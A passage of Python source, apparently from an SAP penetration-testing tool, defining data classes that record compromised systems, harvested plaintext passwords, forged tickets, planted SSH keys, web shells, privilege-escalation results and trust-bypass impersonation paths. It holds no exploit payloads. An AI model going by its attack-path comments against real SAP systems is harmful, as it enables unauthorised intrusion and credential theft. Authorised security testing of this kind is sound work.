    # outline until an active scan promotes it.
    discovered_via_rfc_g: bool = False
    # True when this node was materialised from a DBCON direct-DB
    # pivot (issue #21) — a source ABAP had a /DBCON/<name>
    # secstore entry pointing at THIS host's HANA and probe found
    # USR02 present.  Renders like the other _via_ discovery flags.
    discovered_via_dbcon: bool = False
    # Which source SAP + DBCON entry name led us here.  Purely
    # informational — used by the map to draw the trust line from
    # the source cylinder to this node once it's promoted.
    dbcon_parent_sid: str = ""
    dbcon_parent_con_name: str = ""
    # Which SAPMAP enrichment stage produced the authoritative
    # sysinfo (SID / hostname / DB type / kernel / release / OS).
    # Values today: "rfcsi_anon" (Stage 0 pure-stdlib RFC_SYSTEM_INFO
    # probe, from Julian's sap-rfm-enum), "sapcontrol",
    # "public_info", "diag", "ms_http", or "" when unknown / mixed.
    # Shown in the engagement report + GUI detail panel so an
    # operator can tell where a field came from.
    sysinfo_source: str = ""
    # Similar flag for the CTS/TMS pivot (Bundle 1).  True when this
    # node was auto-materialised by probing a TMSADM RFC destination
    # from another SAP system — parent = the ABAP that owned the
    # /RFC/TMSADM@<us>.DOMAIN_<x> secstore entry.
    discovered_via_tms: bool = False
    tms_parent_sid: str = ""
    # True when this node is the transport-domain controller.  Set
    # when TMSMCONF.DOMAINCTL matches this SID.  Rendered as a
    # "CTRL" pill on the map (like the "SAP" badge on DBCON).
    is_tms_controller: bool = False
    tms_domain: str = ""

    # USREXTID table — on-prem cert-CN → ABAP user mapping.  Populated
    # by Data Extraction → Read USREXTID.  Each entry is a row dict
    # with MANDT/BNAME/EXTID/TYPE/SEQNO.  Pairs with the SCC PP
    # analyser (sapmap_scc_pp_analyzer.analyze_pp_impersonation) to
    # answer "which ABAP users can a cloud caller impersonate
    # through this SCC tunnel".
    usrextid_entries: list = field(default_factory=list)
    usrextid_read_at: str = ""   # ISO timestamp — empty = never read
    pp_impersonation: dict = field(default_factory=dict)
    # Live PP-impersonation verification (sap_pp_probe.verify_pp).
    # ``pp_verification`` is the full bundle returned by the probe;
    # ``pp_verification_confirmed`` is the quick boolean for badge /
    # report rendering.  Last verification timestamp is inside the
    # bundle as ``verified_at``.
    pp_verification: dict = field(default_factory=dict)
    pp_verification_confirmed: bool = False
        # {ok, rule_template, rule_caller_controlled, matched_users:[],
        #  privileged_users:[], exploitability:"trivial"|"constrained"
        #  |"blocked", notes, scc_host:"<host>"}

    # OAuth2 client profiles configured on this ABAP system (transaction
    # OA2C_CONFIG).  Each row joins OA2C_CLIENT (client_id, token
    # endpoint, …) with OA2C_CLIENT_EXT (grant_type) by CLIENT_UUID;
    # the matching client_secret lives in RSECTAB under
    # /OA2C/CS_<CLIENT_UUID-no-hyphens>_<NN>.  Populated by
    # /api/node/<sid>/read_oa2c.  Each entry is a plain dict so
    # to_dict() stays JSON-safe.
    oauth2_profiles: list = field(default_factory=list)
    # Auto-test results for OA2C client_secret → BTP token mint.
    # Each entry: {client_uuid, client_id, token_endpoint, valid, error}
    oa2c_test_results: list = field(default_factory=list)

    # Capability analyser results — what each pwned/credentialed user
    # on this node can actually read/do, mapped from raw auth-object
    # rows (AGR_USERS / AGR_1251 / UST04) to human-readable
    # capabilities ("Vendor bank read", "GL detail read", "OS command
    # execution").  Populated by sapmap_capability_analyser.analyse().
    # One entry per user we own:
    #   {username, client, capabilities: [{auth_object, fields,
    #     capability, tables, severity}], blast_radius, summary}
    capability_results: list = field(default_factory=list)
    # Per-table COUNT(*) cache populated lazily by the row-count
    # probe so a CISO-facing line "BSEG = 20.7M rows" stays cheap on
    # repeat opens (BSEG is huge; uncached COUNT(*) burns seconds).
    capability_row_counts: dict = field(default_factory=dict)

    # Computed helpers
    def has_access(self) -> bool:
        """True if we have any working credentials or created users."""
        return self.pwned or any(c.verified for c in self.credentials)

    def is_exploitable(self) -> bool:
        """True if the system can potentially be exploited (GW vuln or creds available)."""
        return self.gw_vulnerable or self.has_access()

    def highest_severity(self) -> Optional[Severity]:
        if not self.findings:
            return None
        return max(f.severity for f in self.findings)

    def instance_nrs(self) -> list:
        return sorted(set(i.instance_nr for i in self.instances if i.instance_nr != "XX"))

    def all_ips(self) -> set:
        ips = set()
        if self.ip:
            ips.add(self.ip)
        for inst in self.instances:
            if inst.ip:
                ips.add(inst.ip)
        return ips

    def all_hostnames(self) -> set:
        names = set()
        if self.hostname:
            names.add(self.hostname.lower())
        return names

    def best_credentials(self) -> Optional[Credentials]:
        """Return the best available credentials (created user preferred)."""
        # Prefer created users (they have SAP_ALL)
        for cu in self.created_users:
            return Credentials(
                username=cu.username,
                password=cu.password,
                client=cu.client,
                instance_nr=cu.instance_nr,
                verified=True,
            )
        # Then verified provided credentials
        for c in self.credentials:
            if c.verified:
                return c
        # Then any credentials
        if self.credentials:
            return self.credentials[0]
        return None

    def to_dict(self) -> dict:
        return {
            "sid": self.sid,
            "system_type": self.system_type,
            "hostname": self.hostname,
            "ip": self.ip,
            "instances": [i.to_dict() for i in self.instances],
            "os_type": self.os_type,
            "db_type": self.db_type,
            "kernel": self.kernel,
            "sap_release": self.sap_release,
            "dbcon_edges": [e.to_dict() for e in (self.dbcon_edges or [])],
            "clients": self.clients,
            "is_production": self.is_production,
            "findings": [f.to_dict() for f in self.findings],
            "has_critical_finding": self.has_critical_finding,
            "pwned": self.pwned,
            "cert_auth_trusted": self.cert_auth_trusted,
            "credentials": [c.to_dict() for c in self.credentials],
            "created_users": [u.to_dict() for u in self.created_users],
            "forged_tickets": [t.to_dict()
                               for t in self.forged_tickets],
            "icm_ports": list(self.icm_ports),
            "sapology_data": self.sapology_data,
            "gw_vulnerable": self.gw_vulnerable,
            "gw_vulnerable_port": self.gw_vulnerable_port,
            "ms_port": self.ms_port,
            "ms_vulnerable": self.ms_vulnerable,
            "ms_acl_protected": self.ms_acl_protected,
            "cve_2025_31324_checked": self.cve_2025_31324_checked,
            "cve_2025_31324_vulnerable": self.cve_2025_31324_vulnerable,
            "cve_2025_31324_port": self.cve_2025_31324_port,
            "cve_2025_31324_https": self.cve_2025_31324_https,
            "cve_2025_31324_evidence": self.cve_2025_31324_evidence,
            "cve_2025_31324_shells": self.cve_2025_31324_shells,
            "cve_2020_6287_checked": self.cve_2020_6287_checked,
            "cve_2020_6287_vulnerable": self.cve_2020_6287_vulnerable,
            "cve_2020_6287_port": self.cve_2020_6287_port,
            "cve_2020_6287_https": self.cve_2020_6287_https,
            "cve_2020_6287_evidence": self.cve_2020_6287_evidence,
            "cve_2022_22536_checked": self.cve_2022_22536_checked,
            "cve_2022_22536_vulnerable": self.cve_2022_22536_vulnerable,
            "cve_2022_22536_port": self.cve_2022_22536_port,
            "cve_2022_22536_https": self.cve_2022_22536_https,
            "cve_2022_22536_evidence": self.cve_2022_22536_evidence,
            "cve_2022_22536_acl_bypass": dict(self.cve_2022_22536_acl_bypass or {}),
            "is_web_dispatcher": self.is_web_dispatcher,
            "wd_cache_enabled": self.wd_cache_enabled,
            "wd_cache_evidence": self.wd_cache_evidence,
            "wd_backends": list(self.wd_backends or []),
            "discovered_via_wd_sid": self.discovered_via_wd_sid,
            "telnet_override": self.telnet_override,
            "java_deploy_blocked": self.java_deploy_blocked,
            "java_secstore_checked": self.java_secstore_checked,
            "java_secstore_version": self.java_secstore_version,
            "java_secstore_algorithm": self.java_secstore_algorithm,
            "java_secstore_entries": self.java_secstore_entries,
            "java_ume_jsps": self.java_ume_jsps,
            "java_destinations": self.java_destinations,
            "secstore_entries": self.secstore_entries,
            "impact_results": self.impact_results,
            "saprouter": self.saprouter,
            "saprouter_info": self.saprouter_info,
            "snc_info": dict(self.snc_info or {}),
            "scc_links": list(self.scc_links),
            "rfcsysacl_entries": list(self.rfcsysacl_entries),
            "sapsys_cert_subject_dn": self.sapsys_cert_subject_dn,
            "sapsys_cert_issuer_dn": self.sapsys_cert_issuer_dn,
            "sapsys_cert_serial": self.sapsys_cert_serial,
            "usrextid_entries": list(self.usrextid_entries),
            "telemetry_profile": (self.telemetry_profile.to_dict()
                                   if self.telemetry_profile else None),
            "position": list(self.position) if self.position else None,
            "copyfail_vulnerable": self.copyfail_vulnerable,
            "copyfail_root_obtained": self.copyfail_root_obtained,
            "copyfail_kernel": self.copyfail_kernel,
            "dirtyfrag_vulnerable": self.dirtyfrag_vulnerable,
            "dirtyfrag_root_obtained": self.dirtyfrag_root_obtained,
            "dirtyfrag_kernel": self.dirtyfrag_kernel,
            "peditcow_vulnerable": self.peditcow_vulnerable,
            "peditcow_root_obtained": self.peditcow_root_obtained,
            "peditcow_kernel": self.peditcow_kernel,
            "death_star_hook_pid": self.death_star_hook_pid,
            "linux_lpe_method": self.linux_lpe_method,
            "ssh_keys_harvested": self.ssh_keys_harvested,
            "ssh_keys_planted": self.ssh_keys_planted,
            "ssh_access": self.ssh_access or [],
            "miniplasma_vulnerable": self.miniplasma_vulnerable,
            "miniplasma_system_obtained": self.miniplasma_system_obtained,
            "miniplasma_os_build": self.miniplasma_os_build,
            "godpotato_vulnerable": self.godpotato_vulnerable,
            "godpotato_system_obtained": self.godpotato_system_obtained,
            "godpotato_os_build": self.godpotato_os_build,
            "godpotato_has_impersonate": self.godpotato_has_impersonate,
            "efspotato_vulnerable": self.efspotato_vulnerable,
            "efspotato_system_obtained": self.efspotato_system_obtained,
            "efspotato_os_build": self.efspotato_os_build,
            "efspotato_has_impersonate": self.efspotato_has_impersonate,
            "windows_lpe_method": self.windows_lpe_method,
            "dpmon_sap_star_available": self.dpmon_sap_star_available,
            "dpmon_sap_star_used": self.dpmon_sap_star_used,
            "discovered_via_btp": self.discovered_via_btp,
            "discovered_via_rfc_g": self.discovered_via_rfc_g,
            "discovered_via_dbcon": self.discovered_via_dbcon,
            "dbcon_parent_sid": self.dbcon_parent_sid,
            "dbcon_parent_con_name": self.dbcon_parent_con_name,
            "sysinfo_source": self.sysinfo_source,
            "discovered_via_tms": self.discovered_via_tms,
            "tms_parent_sid": self.tms_parent_sid,
            "is_tms_controller": self.is_tms_controller,
            "tms_domain": self.tms_domain,
            "tms_destinations": [d.to_dict() for d in (self.tms_destinations or [])],
            "oauth2_profiles": list(self.oauth2_profiles),
            "oa2c_test_results": list(self.oa2c_test_results),
            "usrextid_entries": list(self.usrextid_entries),
            "usrextid_read_at": self.usrextid_read_at,
            "pp_impersonation": dict(self.pp_impersonation or {}),
            "pp_verification": dict(self.pp_verification or {}),
            "pp_verification_confirmed": self.pp_verification_confirmed,
            "capability_results": list(self.capability_results),
            "capability_row_counts": dict(self.capability_row_counts),
        }

    @classmethod
    def from_dict(cls, d: dict) -> SAPNode:
        node = cls(
            sid=d["sid"],
            system_type=d.get("system_type", ""),
            hostname=d.get("hostname", ""),
            ip=d.get("ip", ""),
            instances=[InstanceInfo.from_dict(i) for i in d.get("instances", [])],
            os_type=d.get("os_type", ""),
            db_type=d.get("db_type", ""),
            kernel=d.get("kernel", ""),
            sap_release=d.get("sap_release", ""),
            dbcon_edges=[DBCONConnection.from_dict(e)
                         for e in d.get("dbcon_edges", [])],
            clients=d.get("clients", []),
            is_production=d.get("is_production", False),
            findings=[Finding.from_dict(f) for f in d.get("findings", [])],
            has_critical_finding=d.get("has_critical_finding", False),
            pwned=d.get("pwned", False),
            cert_auth_trusted=d.get("cert_auth_trusted", False),
            credentials=[Credentials.from_dict(c) for c in d.get("credentials", [])],
            created_users=[CreatedUser.from_dict(u) for u in d.get("created_users", [])],
            forged_tickets=[ForgedTicket.from_dict(t)
                            for t in d.get("forged_tickets", [])],
            icm_ports=list(d.get("icm_ports", [])),
            sapology_data=d.get("sapology_data", {}),
            gw_vulnerable=d.get("gw_vulnerable", False),
            gw_vulnerable_port=d.get("gw_vulnerable_port", 0),
            ms_port=d.get("ms_port", 0),
            ms_vulnerable=d.get("ms_vulnerable", False),
            ms_acl_protected=d.get("ms_acl_protected", False),
            cve_2025_31324_checked=d.get("cve_2025_31324_checked", False),
            cve_2025_31324_vulnerable=d.get("cve_2025_31324_vulnerable", False),
            cve_2025_31324_port=d.get("cve_2025_31324_port", 0),
            cve_2025_31324_https=d.get("cve_2025_31324_https", False),
            cve_2025_31324_evidence=d.get("cve_2025_31324_evidence", ""),
            cve_2025_31324_shells=d.get("cve_2025_31324_shells", []),
            cve_2020_6287_checked=d.get("cve_2020_6287_checked", False),
            cve_2020_6287_vulnerable=d.get("cve_2020_6287_vulnerable", False),
            cve_2020_6287_port=d.get("cve_2020_6287_port", 0),
            cve_2020_6287_https=d.get("cve_2020_6287_https", False),
            cve_2020_6287_evidence=d.get("cve_2020_6287_evidence", ""),
            cve_2022_22536_checked=d.get("cve_2022_22536_checked", False),
            cve_2022_22536_vulnerable=d.get("cve_2022_22536_vulnerable", False),
            cve_2022_22536_port=d.get("cve_2022_22536_port", 0),
            cve_2022_22536_https=d.get("cve_2022_22536_https", False),
            cve_2022_22536_evidence=d.get("cve_2022_22536_evidence", ""),
            cve_2022_22536_acl_bypass=d.get("cve_2022_22536_acl_bypass", {}),
            is_web_dispatcher=d.get("is_web_dispatcher", False),
            wd_cache_enabled=d.get("wd_cache_enabled", False),
            wd_cache_evidence=d.get("wd_cache_evidence", ""),
            wd_backends=d.get("wd_backends", []),
            discovered_via_wd_sid=d.get("discovered_via_wd_sid", ""),
            telnet_override=d.get("telnet_override", ""),
            java_deploy_blocked=d.get("java_deploy_blocked", False),
            java_secstore_checked=d.get("java_secstore_checked", False),
            java_secstore_version=d.get("java_secstore_version", ""),
            java_secstore_algorithm=d.get("java_secstore_algorithm", ""),
            java_secstore_entries=d.get("java_secstore_entries", []),
            java_ume_jsps=d.get("java_ume_jsps", []),
            java_destinations=d.get("java_destinations", []),
            secstore_entries=d.get("secstore_entries", []),
            impact_results=d.get("impact_results", []),
            saprouter=d.get("saprouter", ""),
            saprouter_info=d.get("saprouter_info", {}),
            snc_info=dict(d.get("snc_info", {})),
            scc_links=list(d.get("scc_links", [])),
            rfcsysacl_entries=list(d.get("rfcsysacl_entries", [])),
            sapsys_cert_subject_dn=d.get("sapsys_cert_subject_dn", ""),
            sapsys_cert_issuer_dn=d.get("sapsys_cert_issuer_dn", ""),
            sapsys_cert_serial=d.get("sapsys_cert_serial", ""),
            usrextid_entries=list(d.get("usrextid_entries", [])),
            telemetry_profile=(
                AbapTelemetryProfile.from_dict(d["telemetry_profile"])
                if d.get("telemetry_profile") else None),
            position=tuple(d["position"]) if d.get("position") else None,
            copyfail_vulnerable=d.get("copyfail_vulnerable", False),
            copyfail_root_obtained=d.get("copyfail_root_obtained", False),
            copyfail_kernel=d.get("copyfail_kernel", ""),
            dirtyfrag_vulnerable=d.get("dirtyfrag_vulnerable", False),
            dirtyfrag_root_obtained=d.get("dirtyfrag_root_obtained", False),
            dirtyfrag_kernel=d.get("dirtyfrag_kernel", ""),
            peditcow_vulnerable=d.get("peditcow_vulnerable", False),
            peditcow_root_obtained=d.get("peditcow_root_obtained", False),
            peditcow_kernel=d.get("peditcow_kernel", ""),
            death_star_hook_pid=int(d.get("death_star_hook_pid", 0) or 0),
            linux_lpe_method=d.get("linux_lpe_method", ""),
            ssh_keys_harvested=d.get("ssh_keys_harvested", False),
            ssh_keys_planted=d.get("ssh_keys_planted", False),
            ssh_access=d.get("ssh_access") or None,
            miniplasma_vulnerable=d.get("miniplasma_vulnerable", False),
            miniplasma_system_obtained=d.get(
                "miniplasma_system_obtained", False),
            miniplasma_os_build=d.get("miniplasma_os_build", ""),
            godpotato_vulnerable=d.get("godpotato_vulnerable", False),
            godpotato_system_obtained=d.get(
                "godpotato_system_obtained", False),
            godpotato_os_build=d.get("godpotato_os_build", ""),
            godpotato_has_impersonate=d.get(
                "godpotato_has_impersonate", False),
            efspotato_vulnerable=d.get("efspotato_vulnerable", False),
            efspotato_system_obtained=d.get(
                "efspotato_system_obtained", False),
            efspotato_os_build=d.get("efspotato_os_build", ""),
            efspotato_has_impersonate=d.get(
                "efspotato_has_impersonate", False),
            windows_lpe_method=d.get("windows_lpe_method", ""),
            dpmon_sap_star_available=d.get(
                "dpmon_sap_star_available", False),
            dpmon_sap_star_used=d.get("dpmon_sap_star_used", False),
            discovered_via_btp=d.get("discovered_via_btp", False),
            discovered_via_rfc_g=d.get("discovered_via_rfc_g", False),
            discovered_via_dbcon=d.get("discovered_via_dbcon", False),
            dbcon_parent_sid=d.get("dbcon_parent_sid", ""),
            dbcon_parent_con_name=d.get("dbcon_parent_con_name", ""),
            sysinfo_source=d.get("sysinfo_source", ""),
            discovered_via_tms=d.get("discovered_via_tms", False),
            tms_parent_sid=d.get("tms_parent_sid", ""),
            is_tms_controller=d.get("is_tms_controller", False),
            tms_domain=d.get("tms_domain", ""),
            tms_destinations=[TMSDestination.from_dict(t)
                for t in d.get("tms_destinations", [])],
            oauth2_profiles=list(d.get("oauth2_profiles", [])),
            oa2c_test_results=list(d.get("oa2c_test_results", [])),
            capability_results=list(d.get("capability_results", [])),
            capability_row_counts=dict(
                d.get("capability_row_counts", {})),
        )
        return node


# ---------------------------------------------------------------------------
# DBCONConnection — an external DB the source ABAP calls via NATIVE_SQL.
# Discovered by pairing RSECTAB `/DBCON/<CONNAME>` entries with the
# DBCON table row of the same CON_NAME.  When the paired credential
# opens successfully and the target schema carries USR02, SAPMAP can
# create SAPMAP00 there directly via the DB driver — no RFC hop, no
# SAPXPG on the target.  Non-SAP targets get a data-dump path.  Issue #21.
# ---------------------------------------------------------------------------

@dataclass
class DBCONConnection:
    source_sid:   str = ""     # SID of the ABAP node that owns this DBCON entry
    con_name:     str = ""     # /DBCON/<con_name>  — DBCON.CON_NAME
    dbms:         str = ""     # HDB | ORA | MSS | DB6 | ADA | SYB (upper)
    host:         str = ""     # parsed from DBCON.CON_ENV
    port:         int = 0
    user:         str = ""     # DBCON.USER_NAME
    password:     str = ""     # from RSECTAB (plaintext — matches secstore precedent)
    dbname:       str = ""     # HANA MDC tenant / DB2 DB name / MSSQL initial catalog
    tested:       bool = False
    reachable:    bool = False
    is_sap_shape: bool = False  # target schema has USR02 → SAP-side DB
    # WHY we came to the SAP-shape verdict.  One of:
    #   "usr02_present"    — probe ran, USR02 found (definitive SAP)
    #   "usr02_missing"    — HANA 259 invalid_table (definitive non-SAP)
    #   "no_permission"    — HANA 258 insufficient_privilege (INCONCLUSIVE)
    #   "unknown_error"    — probe raised, unrecognised error code
    #   ""                 — not yet probed
    sap_shape_reason: str = ""
    target_sid:   str = ""     # T000-SYSID on the other side (once tested)
    pwned:        bool = False  # SAPMAP00 created on the target via direct SQL
    error:        str = ""
    tested_at:    str = ""
    # Non-SAP data-extraction: cached table enumeration from
    # SYS.M_TABLES (HANA), populated by dbcon/enumerate_tables.
    # Each row: {schema, table, rows, table_type}
    enumerated_tables: list = field(default_factory=list)
    # HANA reconnaissance sweep results (M_LICENSE, M_HOST_INFORMATION,
    # M_DATABASE, M_SYSTEM_LIMITS...) — keyed dict of facts populated
    # by dbcon/recon_sweep.
    recon_facts: dict = field(default_factory=dict)
    # Loot file path if we've dumped USR02 hashes from this target.
    usr02_hashes_loot_path: str = ""

    def to_dict(self) -> dict:
        return {
            "source_sid":   self.source_sid,
            "con_name":     self.con_name,
            "dbms":         self.dbms,
            "host":         self.host,
            "port":         self.port,
            "user":         self.user,
            "password":     self.password,
            "dbname":       self.dbname,
            "tested":       self.tested,
            "reachable":    self.reachable,
            "is_sap_shape": self.is_sap_shape,
            "sap_shape_reason": self.sap_shape_reason,
            "target_sid":   self.target_sid,
            "pwned":        self.pwned,
            "error":        self.error,
            "tested_at":    self.tested_at,
            "enumerated_tables": list(self.enumerated_tables or []),
            "recon_facts": dict(self.recon_facts or {}),
            "usr02_hashes_loot_path": self.usr02_hashes_loot_path,
        }

    @classmethod
    def from_dict(cls, d: dict) -> "DBCONConnection":
        known = {f.name for f in fields(cls)}
        return cls(**{k: v for k, v in d.items() if k in known})


# ---------------------------------------------------------------------------
# TMSDestination — a TMSADM RFC destination for the CTS/TMS pivot
# (CTS/TMS epic Bundle 1).  Pairs a /RFC/TMSADM@<SID>.DOMAIN_<X>
# RSECTAB entry with a row in TMSCSYS (transport-system config)
# so we know host + client + controller flag for each domain member.
# ---------------------------------------------------------------------------

@dataclass
class TMSDestination:
    source_sid:     str = ""    # owner ABAP that has /RFC/TMSADM@... in RSECTAB
    target_sid:     str = ""    # TMSADM@<SID> — the transport-domain member
    target_host:    str = ""    # from TMSCSYS.HOSTNAME / SYS_NAME
    target_client:  str = "000" # TMSADM lives in 000 by convention
    domain:         str = ""    # transport domain (TMSMCONF.DOMAIN)
    is_controller:  bool = False  # this target owns TMS config for the domain
    password:       str = ""    # from RSECTAB (plaintext — same precedent as DBCON)
    tested:         bool = False
    logon_ok:       bool = False
    tmsadm_roles:   list = field(default_factory=list)   # profile names observed
    tmsadm_has_sap_all: bool = False
    buffer_count:   int = 0     # pending imports on target (TMSBUFFER count)
    recent_transports: list = field(default_factory=list)  # E070/E071 rows
    pwned:          bool = False   # write primitive succeeded (Bundle 2)
    error:          str = ""
    tested_at:      str = ""

    # Fallback reachability — when TMSADM logon fails (wrong password,
    # user locked, S_RFC missing) but another credential we already
    # hold DID succeed against the target host + client 000, we record
    # it here.  This proves the host is up and gives us an alternative
    # path (e.g. SAPMAP00 → BAPI_USER_CREATE1, or OS-exec via a
    # privileged user).  ``logon_ok`` stays False in this case — only
    # TMSADM logon success sets logon_ok True.
    host_reachable: bool = False
    reachable_via:  str = ""    # "<user>@<client>" or "" if not reached
    fallback_error: str = ""    # last fallback error if none worked

    # STMS Secure-Trust bypass (SINSON=1 landscapes).  When the
    # domain enforces "caller username must exist in target client
    # 000", we run a test-import via XBP as a candidate user; the
    # first one that both (a) satisfies the target's trust check
    # AND (b) actually lands the transport gets pinned here.
    # Subsequent Propagate runs against this destination reuse the
    # same impersonation user automatically — no re-picker.
    # Empty means "not yet tested" or "SINSON=0 (no need)".
    impersonation_user:   str = ""
    impersonation_verified_at: str = ""
    sinson_active:        bool = False   # cached TMSMCONF.SINSON

    def to_dict(self) -> dict:
        return {
            "source_sid":     self.source_sid,
            "target_sid":     self.target_sid,
            "target_host":    self.target_host,
            "target_client":  self.target_client,
            "domain":         self.domain,
            "is_controller":  self.is_controller,
            "password":       self.password,
            "tested":         self.tested,
            "logon_ok":       self.logon_ok,
            "tmsadm_roles":   list(self.tmsadm_roles or []),
            "tmsadm_has_sap_all": self.tmsadm_has_sap_all,
            "buffer_count":   self.buffer_count,
            "recent_transports": list(self.recent_transports or []),
            "pwned":          self.pwned,
            "error":          self.error,
            "tested_at":      self.tested_at,
            "host_reachable": self.host_reachable,
            "reachable_via":  self.reachable_via,
            "fallback_error": self.fallback_error,
            "impersonation_user":       self.impersonation_user,
            "impersonation_verified_at": self.impersonation_verified_at,
            "sinson_active":            self.sinson_active,
        }

    @classmethod
    def from_dict(cls, d: dict) -> "TMSDestination":
        known = {f.name for f in fields(cls)}
        return cls(**{k: v for k, v in d.items() if k in known})


# ---------------------------------------------------------------------------
# RFCConnection — a Type-3 RFC destination link between two systems
# ---------------------------------------------------------------------------

@dataclass
class RFCConnection:
    """A Type-3 (ABAP) RFC connection between two SAP systems."""

    source_sid: str
    source_host: str
    target_sid: str = ""
    target_host: str = ""
    target_ip: str = ""
    target_instance_nr: str = ""
    destination_name: str = ""
    rfc_user: str = ""
    client: str = ""

    # User authorization details (from BAPI_USER_GET_DETAIL)
    profiles: list = field(default_factory=list)       # profile names
    roles: list = field(default_factory=list)           # ACTIVITYGROUPS
    has_sap_all: bool = False
    user_detail_error: str = ""  # e.g. "No authorization for BAPI_USER_GET_DETAIL"

    # Fine-grained "can this RFC user create a target-side user?"
    # reach signal — issue #23.  Distinct from has_sap_all so a user
    # who holds S_USER_GRP + S_USER_PRO without SAP_ALL still lights
    # up the Create Remote User path.  None = never probed.
    can_create_user:      Optional[bool] = None
    can_assign_sap_all:   Optional[bool] = None    # S_USER_PRO 22/SAP_ALL
    can_assign_role:      Optional[bool] = None    # S_USER_AGR 22/*
    create_user_probe:    str = ""    # "sap_all" | "role_heuristic"
                                       # | "authority_check" | "canary"
    create_user_evidence: str = ""    # human-readable reason
    create_user_probe_at: str = ""    # ISO timestamp of last probe
    create_user_probe_error: str = ""

    # /SDF/RFC_CHECK results
    logon_successful: bool = False
    logon_tested: bool = False   # True after explicit logon test (Test RFCs)
    ping_ok: bool = False
    latency_ms: int = 0
    check_error: str = ""
    tested: bool = False

    # sapxpg remote test
    sapxpg_remote_works: bool = False

    # Trusted RFC
    trusted_system: bool = False     # SM59 "Trusted System" flag set on this destination
    trust_type: str = ""             # "" | "trusted_rfc" | "strustsso2"

    # Connection type.  Default "rfc" covers classic Type-3 RFC plus
    # Type-T (where sapxpg_remote_works is the active marker).  "http"
    # is set for AS Java HTTP destinations pulled from J2EE_CONFIGENTRY
    # — Java→Java admin / service calls using BASICAUTH etc.
    conn_type: str = "rfc"          # "rfc" | "http"
    # Raw RFCTYPE from the SM59 / RFCDES row.  Kept separately from
    # conn_type so the operator can tell "G = HTTP to external
    # server" apart from "H = HTTP to ABAP system" — the
    # exploitation surface differs (H targets can do SOAP-RFC
    # RFC_PING; G targets typically can't).  Empty when the
    # connection wasn't sourced from an RFCDES row (e.g. BTP
    # destination-service enumeration, Java SecStoreFS parse).
    rfc_type: str = ""              # "3" | "G" | "H" | "T" | "L" | ""
    http_url: str = ""              # full target URL for HTTP destinations
    http_auth_type: str = ""        # BASICAUTHENTICATION | SSO2 | X509 | NONE
    # STRUST SSL Client Application (PSE name).  Populated from the
    # RFCOPTIONS ``t=`` field for cert-authenticated Type G/H rows —
    # e.g. ``DFAULT`` for the standard SSL Client PSE.  When set,
    # ``http_auth_type`` is ``X509`` and the destination authenticates
    # via that PSE's client cert instead of a stored password.  Enables
    # kernel-proxied HTTP calls through HTTP_CLIENT_CREATE_BY_DESTINATION
    # without ever handling the private key ourselves.
    http_cert_pse: str = ""
    http_proxy: str = ""            # "host:port" if the destination uses one
    # Target platform stack for HTTP destinations.  BTP-sourced edges
    # carry this from the destination's sap-platform additional
    # property ("ABAP" | "JAVA"); on-prem-sourced edges may leave it
    # empty.  Used by the HTTP modal to render platform-specific
    # exploitation tips and to decide whether to fetch ABAP profiles
    # after a successful basic-auth probe.
    http_target_platform: str = ""

    # SecStore
    secstore_password: str = ""  # Decrypted password from RSECTAB (if matched)

    # Phase 3a: True when SOAP-RFC RFC_PING with conn.rfc_user +
    # secstore_password succeeded against the target's ICM HTTP port.
    # Distinguishes the "credentials work over HTTP" state from the
    # stronger has_sap_all (which requires a profile read we don't yet
    # have an HTTP equivalent for — that's Phase 3b).
    soap_rfc_verified: bool = False

    # Type G / HTTP-destination target classification.  Populated by
    # _classify_type_g_target during _build_rfcdes_conn so downstream
    # code can route: SAPControl+<sid>adm gets an OS-exec path, ADS
    # gets the Note 1177315 test interpretation, BTP-shaped hosts get
    # the BTPDISC materialisation.
    #
    #   os_access_type — highest-value classification:
    #     "sapcontrol_sidadm"  — /SAPControl.CGI + <sid>adm user
    #                              → OS shell one hop away via OSExecute
    #     "sapcontrol_generic" — /SAPControl.CGI, non-sidadm user
    #     "hostagent_sapadm"   — /SAPHostControl.CGI + sapadm user
    #                              → OS shell for EVERY SID on the host
    #     ""                    — regular Type G
    #   is_ads_dest — Adobe Document Services (Note 1177315 applies)
    #   is_btp_dest — target hostname matches *.hana.ondemand.com
    #                  → materialise as BTPDISC_ placeholder, not RFCDISC_
    #   http_status — last-observed HTTP status from a test/probe
    #   note_1177315_hit — True when a 4xx/5xx test result was
    #                       reinterpreted as "target answered" per
    #                       Note 1177315
    #   os_exec_verified — True after a live OSExecute call returned
    #                       exit code 0 against SAPControl / Host Agent
    os_access_type: str = ""
    is_ads_dest: bool = False
    is_btp_dest: bool = False
    http_status: int = 0
    note_1177315_hit: bool = False
    os_exec_verified: bool = False
    # Which SOAP channel actually confirmed OS execution.  "" (unknown /
    # legacy field), "sapcontrol" (SAPControl OSExecute), or "ctcws"
    # (CTCWebService/FileSystemConfig).  Lets the auth-probe pass in
    # AutoPwn Phase 3 skip re-verification when a prior wave already
    # confirmed the channel, and lets execute_os_command pick the
    # cached pivot without re-detecting.
    os_exec_channel: str = ""
    # OS detected via the Test Connection uname probe: "unix" | "windows" | "".
    # Empty when the probe hasn't run yet OR failed inconclusively;
    # the OSExecute wrap layer falls back to target_node.os_type in
    # that case.  Populated by sapcontrol_auth_probe stage 3.
    target_os_hint: str = ""

    def risk_level(self) -> str:
        """Return risk assessment for this connection.

        os_exec_verified beats has_sap_all: SAP_ALL is
        application-level (still gated by S_RFC / S_TCODE and the ABAP
        auth engine), while a proven OSExecute channel gives shell as
        <sid>adm on the target host — full kernel-level control,
        bypasses the entire SAP auth model.
        """
        if self.os_exec_verified:
            return "CRITICAL"
        if self.has_sap_all and self.logon_successful:
            return "CRITICAL"
        if self.trusted_system:
            return "HIGH"
        if self.logon_successful:
            return "MEDIUM"
        if self.tested and not self.logon_successful:
            return "LOW"
        return "UNKNOWN"

    def to_dict(self) -> dict:
        return {
            "source_sid": self.source_sid,
            "source_host": self.source_host,
            "target_sid": self.target_sid,
            "target_host": self.target_host,
            "target_ip": self.target_ip,
            "target_instance_nr": self.target_instance_nr,
            "destination_name": self.destination_name,
            "rfc_user": self.rfc_user,
            "client": self.client,
            "profiles": self.profiles,
            "roles": self.roles,
            "has_sap_all": self.has_sap_all,
            "user_detail_error": self.user_detail_error,
            "logon_successful": self.logon_successful,
            "logon_tested": self.logon_tested,
            "ping_ok": self.ping_ok,
            "latency_ms": self.latency_ms,
            "check_error": self.check_error,
            "tested": self.tested,
            "sapxpg_remote_works": self.sapxpg_remote_works,
            "trusted_system": self.trusted_system,
            "trust_type": self.trust_type,
            "conn_type": self.conn_type,
            "http_url": self.http_url,
            "http_auth_type": self.http_auth_type,
